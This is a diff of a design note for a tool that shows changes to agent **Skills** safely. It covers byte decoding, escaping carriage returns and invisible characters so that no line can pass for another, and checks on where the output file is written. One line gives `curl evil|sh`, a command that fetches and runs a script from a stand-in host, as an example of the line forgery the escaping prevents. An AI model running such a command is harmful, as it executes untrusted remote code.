@@ -77,14 +77,22 @@ Checked against `main` (`a290700`):
   mark, or, outside Markdown, lenient UTF-8 for a file with no NUL byte) is decoded as it reads it; any other file as
   lenient UTF-8. Either way each byte that cannot be decoded is shown as a `\x..` escape. No file is ever reduced to
   `Binary files … differ`: a script with a NUL byte and a stray byte still runs, so its lines must show. `_decode`
-  becomes public with an `errors` argument: the scan keeps `replace`, the diff passes `backslashreplace`.
+  becomes public with an `errors` argument: the scan keeps `replace`, the diff passes `surrogateescape`, so a byte
+  that cannot be decoded stays apart from the text and is escaped as itself. A file whose bytes differ but whose two
+  sides decode to the same lines, re-encoded or given a byte order mark, would show a header and no hunk: both sides
+  are then shown byte for byte, as lenient UTF-8, after a line
+  `# <path>: shown byte for byte, as its two sides read alike as text`.
 
 - **No line passes for another.** Lines are split at `\n` only, as git splits them, but an editor also breaks lines
   at `\r`, `\v`, `\f`, U+0085, U+2028 and U+2029: a raw `+ok\rcurl evil|sh` would show `curl evil|sh` on a line of its
   own, without its `+`, or forge a `#` line; an invisible character makes two lines look alike that are not. In each
   line these are escaped as `\x..`, `\u....` or `\U........`: every control character but tab (below U+0020, U+007F,
   U+0080 to U+009F); U+2028 and U+2029; every character in `hidden.CRITICAL` or `hidden.WARNING`. A literal `\x0d` in
-  the text reads the same as an escaped carriage return; the reader still sees the line holds one or the other.
+  the text reads the same as an escaped carriage return. Within a file that only matters when two different lines
+  would read alike, such as a typed `echo \x80` turned into the byte: a change that showed as nothing, or as two
+  equal lines. Then every backslash of that file is shown doubled, after a line
+  `# <path>: each backslash shown doubled, as its lines would read alike`; other files keep single backslashes, as
+  they read better.
 
 - **A Myers diff on a step budget, git's format around it.** `difflib`'s `SequenceMatcher` is quadratic or worse on
   crafted input below any size limit, and a cap on edits alone leaves Myers at O((n + m) · D). `diff` first maps each
@@ -118,7 +126,8 @@ Checked against `main` (`a290700`):
   ```
 
   The source line gives the ref once when it did not move, the folder once when it did not change, no old ref or
-  folder for a `+` **Skill**, each folder `quote`d. With no change, the header and `# hull unchanged`.
+  folder for a `+` **Skill**, each folder `quote`d. A `-` **Skill** gets its `# - <skill id>` line alone, so a
+  file of removals only does not read as no change. With no change, the header and `# hull unchanged`.
 
 - **No previous Hull: every Skill shown as added.** When the current `ref`s do not resolve (no `ref`, one not
   cached, or **Patches** redone for the new tips that fail at the old ones), there is nothing to compare, yet that is
@@ -149,8 +158,11 @@ Checked against `main` (`a290700`):
 
   - its name does not end in `.diff`: harnesses load Markdown, YAML and their own formats, never a `.diff`, so the
     file is not taken for a command, rule or agent wherever it lands;
-  - a folder of the resolved path is named `.apm` in any case (`casefold`: `.APM` is the same folder on macOS and
-    Windows), or holds a `SKILL.md`, so it is a **Skill**'s folder or inside one, deployed or vendored;
+  - a folder of the path as given, without `..`, or of the resolved path is named `.apm` in any case
+    (`paths.folded`, as `build --into` checks: `.APM` is the same folder on macOS and Windows, and a link named
+    `.apm` leads a harness into it), or a folder of the resolved path holds a `SKILL.md`, so it is a **Skill**'s
+    folder or inside one, deployed or vendored;
+  - its folder does not exist, so the run fails before fetching, not at its last write;
   - the path exists and is not a regular file (`lstat`: a symbolic link, folder, FIFO or device), so nothing blocks or
     reads without end;
   - it is a regular file whose first bytes, read up to the header's first line's length, are not that line.
